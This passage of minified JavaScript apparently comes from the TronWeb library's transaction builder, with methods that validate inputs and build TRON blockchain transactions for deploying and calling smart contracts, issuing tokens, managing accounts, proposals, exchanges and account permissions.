                let o = t.userFeePercentage;
                "number" === typeof o || o || (o = 100);
                const i = t.originEnergyLimit || 1e7
                  , s = t.callValue || 0
                  , a = t.tokenValue
                  , c = t.tokenId || t.token_id;
                let {abi: l} = t;
                const {parameters: u=[]} = t;
                let d = "";
                const {bytecode: h=!1, name: f=""} = t;
                if (l && dS(l))
                    try {
                        l = JSON.parse(l)
                    } catch (B) {
                        throw new Error("Invalid options.abi provided")
                    }
                const p = l;
                let g = p;
                if (p.entrys && (g = p.entrys),
                !aS(g))
                    throw new Error("Invalid options.abi provided");
                const y = g.some((e => "constructor" === e.type && "payable" === e.stateMutability.toLowerCase()));
                if (this.validator.notValid([{
                    name: "bytecode",
                    type: "hex",
                    value: h
                }, {
                    name: "feeLimit",
                    type: "integer",
                    value: n,
                    gt: 0
                }, {
                    name: "callValue",
                    type: "integer",
                    value: s,
                    gte: 0
                }, {
                    name: "userFeePercentage",
                    type: "integer",
                    value: o,
                    gte: 0,
                    lte: 100
                }, {
                    name: "originEnergyLimit",
                    type: "integer",
                    value: i,
                    gte: 0,
                    lte: 1e7
                }, {
                    name: "parameters",
                    type: "array",
                    value: u
                }, {
                    name: "issuer",
                    type: "address",
                    value: r
                }, {
                    name: "tokenValue",
                    type: "integer",
                    value: a,
                    gte: 0,
                    optional: !0
                }, {
                    name: "tokenId",
                    type: "integer",
                    value: c,
                    gte: 0,
                    optional: !0
                }]),
                !y && (s > 0 || a > 0))
                    throw new Error("When contract is not payable, options.callValue and options.tokenValue must be 0");
                const {rawParameter: m, funcABIV2: b, parametersV2: v} = t;
                if (m && dS(m))
                    d = m.replace(/^(0x)/, "");
                else if (b)
                    d = ND(b, v).replace(/^(0x)/, "");
                else {
                    let e = g.find((e => "constructor" === e.type));
                    if ("undefined" !== typeof e && e) {
                        const t = new bW
                          , r = []
                          , n = [];
                        if (e = e.inputs,
                        u.length != e.length)
                            throw new Error("constructor needs ".concat(e.length, " but ").concat(u.length, " provided"));
                        for (let o = 0; o < u.length; o++) {
                            var w;
                            let t = e[o].type
                              , i = u[o];
                            if (!t || !dS(t) || !t.length)
                                throw new Error("Invalid parameter type provided: " + t);
                            const s = e => aS(e) ? e.map((e => s(e))) : tF(e).replace(JN, "0x");
                            "address" === t || "address[" === (null === (w = t.match(/^([^\x5b]*)(\x5b|$)/)) || void 0 === w ? void 0 : w[0]) ? i = s(i) : /trcToken/.test(t) && (t = t.replace(/trcToken/, "uint256")),
                            r.push(t),
                            n.push(i)
                        }
                        try {
                            d = t.encode(r, n).replace(/^(0x)/, "")
                        } catch (x) {
                            throw new Error(x)
                        }
                    } else
                        d = ""
                }
                const T = {
                    owner_address: tF(r),
                    fee_limit: parseInt(n),
                    call_value: parseInt(s),
                    consume_user_resource_percent: o,
                    origin_energy_limit: i,
                    abi: JSON.stringify(g),
                    bytecode: h,
                    parameter: d,
                    name: f
                };
                wS(a) && (T.call_token_value = parseInt(a)),
                wS(c) && (T.token_id = parseInt(c));
                const A = {};
                A.owner_address = T.owner_address,
                wS(T.call_token_value) && (A.call_token_value = T.call_token_value),
                wS(T.token_id) && (A.token_id = T.token_id);
                const E = A.new_contract = {};
                T.abi ? E.abi = {
                    entrys: JSON.parse(T.abi)
                } : E.abi = {},
                T.call_value && (E.call_value = T.call_value),
                E.consume_user_resource_percent = T.consume_user_resource_percent,
                E.origin_energy_limit = T.origin_energy_limit,
                E.origin_address = null !== (e = T.origin_address) && void 0 !== e ? e : T.owner_address,
                T.bytecode + T.parameter && (E.bytecode = (T.bytecode + T.parameter).replace(/^0x/, "")),
                wS(T.name) && (E.name = T.name);
                const P = YL(t)
                  , C = await ZL(this.tronWeb, DD.CreateSmartContract, A, null === t || void 0 === t ? void 0 : t.permissionId, (0,
                k.A)((0,
                k.A)({}, P), {}, {
                    fee_limit: T.fee_limit
                }));
                var S, I;
                return C.contract_address = (S = T.owner_address,
                I = C.txID,
                "41" + ix(Buffer.from(I + S, "hex")).toString().substring(2).slice(24)),
                C
            }
            async triggerSmartContract(e, t, r, n, o) {
                var i;
                const s = [e, t, r, n, o];
                return "object" !== typeof s[2] && (s[2] = {
                    feeLimit: s[2],
                    callValue: s[3]
                },
                s.splice(3, 1)),
                null !== (i = s[2]) && void 0 !== i && i.txLocal ? this._triggerSmartContractLocal(...s) : this._triggerSmartContract(...s)
            }
            async triggerConstantContract(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {}
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : []
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : this.tronWeb.defaultAddress.hex;
                return r._isConstant = !0,
                this._triggerSmartContract(e, t, r, n, o)
            }
            async triggerConfirmedConstantContract(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {}
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : []
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : this.tronWeb.defaultAddress.hex;
                return r._isConstant = !0,
                r.confirmed = !0,
                this._triggerSmartContract(e, t, r, n, o)
            }
            async estimateEnergy(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {}
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : []
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : this.tronWeb.defaultAddress.hex;
                r.estimateEnergy = !0;
                return await this._triggerSmartContract(e, t, r, n, o)
            }
            async deployConstantContract() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {
                    input: "",
                    ownerAddress: ""
                };
                const {input: t, ownerAddress: r, tokenId: n, tokenValue: o, callValue: i=0} = e;
                this.validator.notValid([{
                    name: "input",
                    type: "not-empty-string",
                    value: t
                }, {
                    name: "callValue",
                    type: "integer",
                    value: i,
                    gte: 0
                }, {
                    name: "owner",
                    type: "address",
                    value: r
                }, {
                    name: "tokenValue",
                    type: "integer",
                    value: o,
                    gte: 0,
                    optional: !0
                }, {
                    name: "tokenId",
                    type: "integer",
                    value: n,
                    gte: 0,
                    optional: !0
                }]);
                const s = {
                    data: t,
                    owner_address: tF(r),
                    call_value: i
                };
                n && (s.token_id = n),
                o && (s.call_token_value = o);
                const a = "wallet".concat(e.confirmed ? "solidity" : "", "/estimateenergy")
                  , c = await this.tronWeb[e.confirmed ? "solidityNode" : "fullNode"].request(a, s, "post");
                if (c.Error)
                    throw new Error(c.Error);
                if (c.result && c.result.message)
                    throw new Error(this.tronWeb.toUtf8(c.result.message));
                return c
            }
            _getTriggerSmartContractArgs(e, t, r, n, o, i, s, a, c) {
                const l = {
                    contract_address: tF(e),
                    owner_address: tF(o)
                };
                if (t && dS(t)) {
                    let e;
                    if (t = t.replace(/\s*/g, ""),
                    n.length) {
                        const t = new bW;
                        let r = [];
                        const o = [];
                        for (let e = 0; e < n.length; e++) {
                            var u;
                            let {value: t} = n[e];
                            const {type: i} = n[e];
                            if (!i || !dS(i) || !i.length)
                                throw new Error("Invalid parameter type provided: " + i);
                            const s = e => aS(e) ? e.map((e => s(e))) : tF(e).replace(JN, "0x");
                            ("address" === i || "address[" === (null === (u = i.match(/^([^\x5b]*)(\x5b|$)/)) || void 0 === u ? void 0 : u[0])) && (t = s(t)),
                            r.push(i),
                            o.push(t)
                        }
                        try {
                            r = r.map((e => (/trcToken/.test(e) && (e = e.replace(/trcToken/, "uint256")),
                            e))),
                            e = t.encode(r, o).replace(/^(0x)/, "")
                        } catch (d) {
                            throw new Error(d)
                        }
                    } else
                        e = "";
                    r.funcABIV2 && (e = ND(r.funcABIV2, r.parametersV2).replace(/^(0x)/, "")),
                    r.shieldedParameter && dS(r.shieldedParameter) && (e = r.shieldedParameter.replace(/^(0x)/, "")),
                    r.rawParameter && dS(r.rawParameter) && (e = r.rawParameter.replace(/^(0x)/, "")),
                    l.function_selector = t,
                    l.parameter = e
                } else
                    r.input && (l.data = r.input);
                return l.call_value = parseInt(a),
                wS(i) && (l.call_token_value = parseInt(i)),
                wS(s) && (l.token_id = parseInt(s)),
                r._isConstant || r.estimateEnergy || (l.fee_limit = parseInt(c)),
                r.permissionId && (l.Permission_id = r.permissionId),
                l
            }
            async _triggerSmartContractLocal(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {}
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : []
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : this.tronWeb.defaultAddress.hex;
                const {tokenValue: i, tokenId: s, callValue: a, feeLimit: c} = Object.assign({
                    callValue: 0,
                    feeLimit: this.tronWeb.feeLimit
                }, r);
                this.validator.notValid([{
                    name: "feeLimit",
                    type: "integer",
                    value: c,
                    gt: 0
                }, {
                    name: "callValue",
                    type: "integer",
                    value: a,
                    gte: 0
                }, {
                    name: "parameters",
                    type: "array",
                    value: n
                }, {
                    name: "contract",
                    type: "address",
                    value: e
                }, {
                    name: "issuer",
                    type: "address",
                    value: o,
                    optional: !0
                }, {
                    name: "tokenValue",
                    type: "integer",
                    value: i,
                    gte: 0,
                    optional: !0
                }, {
                    name: "tokenId",
                    type: "integer",
                    value: s,
                    gte: 0,
                    optional: !0
                }]);
                const l = this._getTriggerSmartContractArgs(e, t, r, n, o, i, s, a, c);
                l.function_selector && (l.data = ix(Buffer.from(l.function_selector, "utf-8")).toString().substring(2, 10) + l.parameter);
                const u = {
                    data: l.data,
                    owner_address: l.owner_address,
                    contract_address: l.contract_address
                };
                l.call_value && (u.call_value = l.call_value),
                l.call_token_value && (u.call_token_value = l.call_token_value),
                l.token_id && (u.token_id = l.token_id);
                const d = YL(r);
                return {
                    result: {
                        result: !0
                    },
                    transaction: await ZL(this.tronWeb, DD.TriggerSmartContract, u, r.permissionId, (0,
                    k.A)((0,
                    k.A)({}, d), {}, {
                        fee_limit: l.fee_limit
                    }))
                }
            }
            async _triggerSmartContract(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {}
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : []
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : this.tronWeb.defaultAddress.hex;
                const {tokenValue: i, tokenId: s, callValue: a, feeLimit: c} = Object.assign({
                    callValue: 0,
                    feeLimit: this.tronWeb.feeLimit
                }, r);
                this.validator.notValid([{
                    name: "feeLimit",
                    type: "integer",
                    value: c,
                    gt: 0
                }, {
                    name: "callValue",
                    type: "integer",
                    value: a,
                    gte: 0
                }, {
                    name: "parameters",
                    type: "array",
                    value: n
                }, {
                    name: "contract",
                    type: "address",
                    value: e
                }, {
                    name: "issuer",
                    type: "address",
                    value: o,
                    optional: !0
                }, {
                    name: "tokenValue",
                    type: "integer",
                    value: i,
                    gte: 0,
                    optional: !0
                }, {
                    name: "tokenId",
                    type: "integer",
                    value: s,
                    gte: 0,
                    optional: !0
                }]);
                const l = this._getTriggerSmartContractArgs(e, t, r, n, o, i, s, a, c);
                let u = "triggersmartcontract";
                r._isConstant ? u = "triggerconstantcontract" : r.estimateEnergy && (u = "estimateenergy"),
                u = "wallet".concat(r.confirmed ? "solidity" : "", "/").concat(u);
                return function(e, t, r) {
                    if (e.Error)
                        throw new Error(e.Error);
                    if (e.result && e.result.message)
                        throw new Error(lj.toUtf8(e.result.message));
                    if (!r._isConstant && !r.estimateEnergy) {
                        if (DL(e.transaction, t, r))
                            return e;
                        throw new Error("Invalid transaction")
                    }
                    return e
                }(await this.tronWeb[r.confirmed ? "solidityNode" : "fullNode"].request(u, l, "post"), l, r)
            }
            async clearABI(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                if (!lj.isAddress(e))
                    throw new Error("Invalid contract address provided");
                if (!lj.isAddress(t))
                    throw new Error("Invalid owner address provided");
                const n = {
                    contract_address: tF(e),
                    owner_address: tF(t)
                };
                this.tronWeb.trx.cache.contracts[e] && delete this.tronWeb.trx.cache.contracts[e];
                const o = YL(r);
                return ZL(this.tronWeb, DD.ClearABIContract, n, null === r || void 0 === r ? void 0 : r.permissionId, o)
            }
            async updateBrokerage(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                if (!wS(e))
                    throw new Error("Invalid brokerage provided");
                if (!pS(e) || e < 0 || e > 100)
                    throw new Error("Brokerage must be an integer between 0 and 100");
                if (!lj.isAddress(t))
                    throw new Error("Invalid owner address provided");
                const n = {
                    brokerage: parseInt(e),
                    owner_address: tF(t)
                }
                  , o = YL(r);
                return ZL(this.tronWeb, DD.UpdateBrokerageContract, n, null === r || void 0 === r ? void 0 : r.permissionId, o)
            }
            async createToken() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex;
                const {name: r=!1, abbreviation: n=!1, description: o="", url: i=!1, totalSupply: s=0, trxRatio: a=1, tokenRatio: c=1, saleStart: l=Date.now(), saleEnd: u=!1, freeBandwidth: d=0, freeBandwidthLimit: h=0, frozenAmount: f=0, frozenDuration: p=0, voteScore: g, precision: y} = e;
                if (this.validator.notValid([{
                    name: "Supply amount",
                    type: "positive-integer",
                    value: s
                }, {
                    name: "TRX ratio",
                    type: "positive-integer",
                    value: a
                }, {
                    name: "Token ratio",
                    type: "positive-integer",
                    value: c
                }, {
                    name: "token abbreviation",
                    type: "string",
                    value: n,
                    lte: 32,
                    gt: 0
                }, {
                    name: "token name",
                    type: "not-empty-string",
                    value: r
                }, {
                    name: "token description",
                    type: "string",
                    value: o,
                    lte: 200
                }, {
                    name: "token url",
                    type: "url",
                    value: i
                }, {
                    name: "token url",
                    type: "string",
                    value: i,
                    lte: 256
                }, {
                    name: "issuer",
                    type: "address",
                    value: t
                }, {
                    name: "sale start timestamp",
                    type: "integer",
                    value: l,
                    gte: Date.now()
                }, {
                    name: "sale end timestamp",
                    type: "integer",
                    value: u,
                    gt: l
                }, {
                    name: "Frozen supply",
                    type: "integer",
                    value: f,
                    gte: 0
                }, {
                    name: "Frozen duration",
                    type: "integer",
                    value: p,
                    gte: 0
                }]),
                wS(g) && (!pS(g) || g <= 0))
                    throw new Error("voteScore must be a positive integer greater than 0");
                if (wS(y) && (!pS(y) || y < 0 || y > 6))
                    throw new Error("precision must be a positive integer >= 0 and <= 6");
                const m = {
                    owner_address: tF(t),
                    name: GL(r),
                    abbr: GL(n),
                    description: GL(o),
                    url: GL(i),
                    total_supply: parseInt(s),
                    trx_num: parseInt(a),
                    num: parseInt(c),
                    start_time: parseInt(l),
                    end_time: parseInt(u),
                    frozen_supply: [{
                        frozen_amount: parseInt(f),
                        frozen_days: parseInt(p)
                    }]
                };
                ["name", "abbr", "description", "url"].forEach((e => {
                    m[e] || delete m[e]
                }
                )),
                parseInt(f) > 0 || delete m.frozen_supply,
                d && !isNaN(parseInt(d)) && parseInt(d) >= 0 && (m.free_asset_net_limit = parseInt(d)),
                h && !isNaN(parseInt(h)) && parseInt(h) >= 0 && (m.public_free_asset_net_limit = parseInt(h)),
                y && !isNaN(parseInt(y)) && (m.precision = parseInt(y)),
                g && !isNaN(parseInt(g)) && (m.vote_score = parseInt(g));
                const b = YL(e);
                return ZL(this.tronWeb, DD.AssetIssueContract, m, null === e || void 0 === e ? void 0 : e.permissionId, b)
            }
            async createAccount(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                this.validator.notValid([{
                    name: "account",
                    type: "address",
                    value: e
                }, {
                    name: "origin",
                    type: "address",
                    value: t
                }]);
                const n = {
                    owner_address: tF(t),
                    account_address: tF(e)
                }
                  , o = YL(r);
                return ZL(this.tronWeb, DD.AccountCreateContract, n, null === r || void 0 === r ? void 0 : r.permissionId, o)
            }
            async updateAccount(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                this.validator.notValid([{
                    name: "Name",
                    type: "string",
                    lte: 200,
                    gt: 0,
                    value: e,
                    msg: "Invalid accountName"
                }, {
                    name: "origin",
                    type: "address",
                    value: t
                }]);
                const n = {
                    account_name: GL(e),
                    owner_address: tF(t)
                }
                  , o = YL(r);
                return ZL(this.tronWeb, DD.AccountUpdateContract, n, null === r || void 0 === r ? void 0 : r.permissionId, o)
            }
            async setAccountId(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                e && dS(e) && e.startsWith("0x") && (e = e.slice(2)),
                this.validator.notValid([{
                    name: "accountId",
                    type: "hex",
                    value: e
                }, {
                    name: "accountId",
                    type: "string",
                    lte: 32,
                    gte: 8,
                    value: e
                }, {
                    name: "origin",
                    type: "address",
                    value: t
                }]);
                const n = {
                    account_id: e,
                    owner_address: tF(t)
                }
                  , o = YL(r);
                return ZL(this.tronWeb, DD.SetAccountIdContract, n, null === r || void 0 === r ? void 0 : r.permissionId, o)
            }
            async updateToken() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex;
                const {description: r="", url: n=!1, freeBandwidth: o=0, freeBandwidthLimit: i=0} = e;
                this.validator.notValid([{
                    name: "token description",
                    type: "string",
                    value: r,
                    lte: 200
                }, {
                    name: "token url",
                    type: "url",
                    value: n
                }, {
                    name: "token url",
                    type: "string",
                    value: n,
                    lte: 256
                }, {
                    name: "issuer",
                    type: "address",
                    value: t
                }]);
                const s = {
                    owner_address: tF(t),
                    description: GL(r),
                    url: GL(n)
                };
                o && !isNaN(parseInt(o)) && parseInt(o) >= 0 && (s.new_limit = parseInt(o)),
                i && !isNaN(parseInt(i)) && parseInt(i) >= 0 && (s.new_public_limit = parseInt(i));
                const a = YL(e);
                return ZL(this.tronWeb, DD.UpdateAssetContract, s, null === e || void 0 === e ? void 0 : e.permissionId, a)
            }
            async sendAsset(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0
                  , r = arguments.length > 2 ? arguments[2] : void 0
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultAddress.hex
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {};
                return this.sendToken(e, t, r, n, o)
            }
            async purchaseAsset(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultAddress.hex
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {};
                return this.purchaseToken(e, t, r, n, o)
            }
            async createAsset(e, t) {
                return this.createToken(e, t)
            }
            async updateAsset() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex;
                return this.updateToken(e, t)
            }
            async createProposal(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                this.validator.notValid([{
                    name: "issuer",
                    type: "address",
                    value: t
                }]);
                const n = "Invalid proposal parameters provided";
                if (!e)
                    throw new Error(n);
                const o = aS(e) ? e : [e];
                for (const a of o)
                    if (!sS(a))
                        throw new Error(n);
                const i = {
                    owner_address: tF(t),
                    parameters: o
                }
                  , s = YL(r);
                return ZL(this.tronWeb, DD.ProposalCreateContract, i, null === r || void 0 === r ? void 0 : r.permissionId, s)
            }
            async deleteProposal(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                this.validator.notValid([{
                    name: "issuer",
                    type: "address",
                    value: t
                }, {
                    name: "proposalID",
                    type: "integer",
                    value: e,
                    gte: 0
                }]);
                const n = {
                    owner_address: tF(t),
                    proposal_id: parseInt(e)
                }
                  , o = YL(r);
                return ZL(this.tronWeb, DD.ProposalDeleteContract, n, null === r || void 0 === r ? void 0 : r.permissionId, o)
            }
            async voteProposal(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1]
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.tronWeb.defaultAddress.hex
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                this.validator.notValid([{
                    name: "voter",
                    type: "address",
                    value: r
                }, {
                    name: "proposalID",
                    type: "integer",
                    value: e,
                    gte: 0
                }, {
                    name: "has approval",
                    type: "boolean",
                    value: t
                }]);
                const o = {
                    owner_address: tF(r),
                    proposal_id: parseInt(e),
                    is_add_approval: t
                }
                  , i = YL(n);
                return ZL(this.tronWeb, DD.ProposalApproveContract, o, null === n || void 0 === n ? void 0 : n.permissionId, i)
            }
            async createTRXExchange(e, t, r) {
                let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultAddress.hex
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {};
                this.validator.notValid([{
                    name: "owner",
                    type: "address",
                    value: n
                }, {
                    name: "token name",
                    type: "not-empty-string",
                    value: e
                }, {
                    name: "token balance",
                    type: "positive-integer",
                    value: t
                }, {
                    name: "trx balance",
                    type: "positive-integer",
                    value: r
                }]);
                const i = {
                    owner_address: tF(n),
                    first_token_id: GL(e),
                    first_token_balance: t,
                    second_token_id: "5f",
                    second_token_balance: r
                }
                  , s = YL(o);
                return ZL(this.tronWeb, DD.ExchangeCreateContract, i, null === o || void 0 === o ? void 0 : o.permissionId, s)
            }
            async createTokenExchange(e, t, r, n) {
                let o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : this.tronWeb.defaultAddress.hex
                  , i = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : {};
                this.validator.notValid([{
                    name: "owner",
                    type: "address",
                    value: o
                }, {
                    name: "first token name",
                    type: "not-empty-string",
                    value: e
                }, {
                    name: "second token name",
                    type: "not-empty-string",
                    value: r
                }, {
                    name: "first token balance",
                    type: "positive-integer",
                    value: t
                }, {
                    name: "second token balance",
                    type: "positive-integer",
                    value: n
                }]);
                const s = {
                    owner_address: tF(o),
                    first_token_id: GL(e),
                    first_token_balance: t,
                    second_token_id: GL(r),
                    second_token_balance: n
                }
                  , a = YL(i);
                return ZL(this.tronWeb, DD.ExchangeCreateContract, s, null === i || void 0 === i ? void 0 : i.permissionId, a)
            }
            async injectExchangeTokens(e, t, r) {
                let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultAddress.hex
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {};
                this.validator.notValid([{
                    name: "owner",
                    type: "address",
                    value: n
                }, {
                    name: "token name",
                    type: "not-empty-string",
                    value: t
                }, {
                    name: "token amount",
                    type: "integer",
                    value: r,
                    gte: 1
                }, {
                    name: "exchangeID",
                    type: "integer",
                    value: e,
                    gte: 0
                }]);
                const i = {
                    owner_address: tF(n),
                    exchange_id: parseInt(e),
                    token_id: GL(t),
                    quant: parseInt(r)
                }
                  , s = YL(o);
                return ZL(this.tronWeb, DD.ExchangeInjectContract, i, null === o || void 0 === o ? void 0 : o.permissionId, s)
            }
            async withdrawExchangeTokens(e, t, r) {
                let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultAddress.hex
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {};
                this.validator.notValid([{
                    name: "owner",
                    type: "address",
                    value: n
                }, {
                    name: "token name",
                    type: "not-empty-string",
                    value: t
                }, {
                    name: "token amount",
                    type: "integer",
                    value: r,
                    gte: 1
                }, {
                    name: "exchangeID",
                    type: "integer",
                    value: e,
                    gte: 0
                }]);
                const i = {
                    owner_address: tF(n),
                    exchange_id: parseInt(e),
                    token_id: GL(t),
                    quant: parseInt(r)
                }
                  , s = YL(o);
                return ZL(this.tronWeb, DD.ExchangeWithdrawContract, i, null === o || void 0 === o ? void 0 : o.permissionId, s)
            }
            async tradeExchangeTokens(e, t, r, n) {
                let o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : this.tronWeb.defaultAddress.hex
                  , i = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : {};
                this.validator.notValid([{
                    name: "owner",
                    type: "address",
                    value: o
                }, {
                    name: "token name",
                    type: "not-empty-string",
                    value: t
                }, {
                    name: "tokenAmountSold",
                    type: "integer",
                    value: r,
                    gte: 1
                }, {
                    name: "tokenAmountExpected",
                    type: "integer",
                    value: n,
                    gte: 1
                }, {
                    name: "exchangeID",
                    type: "integer",
                    value: e,
                    gte: 0
                }]);
                const s = {
                    owner_address: tF(o),
                    exchange_id: parseInt(e),
                    token_id: lj.fromAscii(t).replace(/^0x/, ""),
                    quant: parseInt(r),
                    expected: parseInt(n)
                }
                  , a = YL(i);
                return ZL(this.tronWeb, DD.ExchangeTransactionContract, s, null === i || void 0 === i ? void 0 : i.permissionId, a)
            }
            async updateSetting(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.tronWeb.defaultAddress.hex
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                this.validator.notValid([{
                    name: "owner",
                    type: "address",
                    value: r
                }, {
                    name: "contract",
                    type: "address",
                    value: e
                }, {
                    name: "userFeePercentage",
                    type: "integer",
                    value: t,
                    gte: 0,
                    lte: 100
                }]);
                const o = {
                    owner_address: tF(r),
                    contract_address: tF(e),
                    consume_user_resource_percent: t
                }
                  , i = YL(n);
                return ZL(this.tronWeb, DD.UpdateSettingContract, o, null === n || void 0 === n ? void 0 : n.permissionId, i)
            }
            async updateEnergyLimit(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.tronWeb.defaultAddress.hex
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                this.validator.notValid([{
                    name: "owner",
                    type: "address",
                    value: r
                }, {
                    name: "contract",
                    type: "address",
                    value: e
                }, {
                    name: "originEnergyLimit",
                    type: "integer",
                    value: t,
                    gte: 0,
                    lte: 1e7
                }]);
                const o = {
                    owner_address: tF(r),
                    contract_address: tF(e),
                    origin_energy_limit: t
                }
                  , i = YL(n);
                return ZL(this.tronWeb, DD.UpdateEnergyLimitContract, o, null === n || void 0 === n ? void 0 : n.permissionId, i)
            }
            checkPermissions(e, t) {
                if (e) {
                    if (e.type !== t || !e.permission_name || !dS(e.permission_name) || !pS(e.threshold) || e.threshold < 1 || !e.keys)
                        return !1;
                    for (const r of e.keys)
                        if (!lj.isAddress(r.address) || !pS(r.weight) || r.weight > e.threshold || r.weight < 1 || 2 === t && !e.operations)
                            return !1
                }
                return !0
            }
            async updateAccountPermissions() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 ? arguments[1] : void 0
                  , r = arguments.length > 2 ? arguments[2] : void 0
                  , n = arguments.length > 3 ? arguments[3] : void 0
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {};
                if (!lj.isAddress(e))
                    throw new Error("Invalid ownerAddress provided");
                if (!this.checkPermissions(t, 0))
                    throw new Error("Invalid ownerPermissions provided");
                if (!this.checkPermissions(r, 1))
                    throw new Error("Invalid witnessPermissions provided");
                Array.isArray(n) || (n = [n]);
                for (const c of n)
                    if (!this.checkPermissions(c, 2))
                        throw new Error("Invalid activesPermissions provided");
                const i = {
                    owner_address: tF(e)
                };
                if (t) {
                    var s;
                    const e = $L(t);
                    "type"in e && delete e.type,
                    e.keys = null === (s = e.keys) || void 0 === s ? void 0 : s.map((e => {
                        let {address: t, weight: r} = e;
                        return {
                            address: this.tronWeb.address.toHex(t),
                            weight: r
                        }
                    }
                    )),
                    i.owner = e
                }
                if (r) {
                    const e = $L(r);
                    e.type = "Witness",
                    e.keys = e.keys.map((e => {
                        let {address: t, weight: r} = e;
                        return {
                            address: this.tronWeb.address.toHex(t),
                            weight: r
                        }
                    }
                    )),
                    i.witness = e
                }
                if (n) {
                    const e = $L(n);
                    e.forEach((e => {
                        e.type = "Active"
                    }
                    )),
                    e.forEach((e => {
                        e.keys = e.keys.map((e => {
                            let {address: t, weight: r} = e;
                            return {
                                address: this.tronWeb.address.toHex(t),
                                weight: r
                            }
                        }
                        ))
                    }
                    )),
                    i.actives = e
                }
                const a = YL(o);
                return ZL(this.tronWeb, DD.AccountPermissionUpdateContract, i, null === o || void 0 === o ? void 0 : o.permissionId, a)
            }
            async newTxID(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (null !== t && void 0 !== t && t.txLocal) {
                    const t = e.raw_data.contract[0];
                    try {
                        const r = await ZL(this.tronWeb, t.type, t.parameter.value, t.Permission_id, {
                            fee_limit: e.raw_data.fee_limit,
                            data: e.raw_data.data,
                            ref_block_bytes: e.raw_data.ref_block_bytes,
                            ref_block_hash: e.raw_data.ref_block_hash,
                            expiration: e.raw_data.expiration,
